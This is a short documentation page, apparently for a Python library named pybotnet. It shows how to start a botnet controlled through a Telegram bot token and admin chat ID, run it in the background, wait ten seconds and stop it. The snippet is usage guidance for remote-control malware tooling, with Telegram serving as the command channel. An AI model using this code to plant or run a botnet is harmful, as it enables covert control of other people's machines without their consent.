
botnet in background, Example:


```py title="main.py"
import time
from pybotnet import BotNet, TelegramEngine

telegram_engine = TelegramEngine(token=TELEGRAM_TOKEN, admin_chat_id=ADMIN_CHAT_ID)

botnet = BotNet(telegram_engine)

botnet.run_background() # (1)

time.sleep(10) # (2)

botnet.stop_background() # (3)

```

1. run botnet in background
2. just wait for 10s 
3. stop botnet


in above example we run botnet in backgrund, wait for 10s and stop it! 
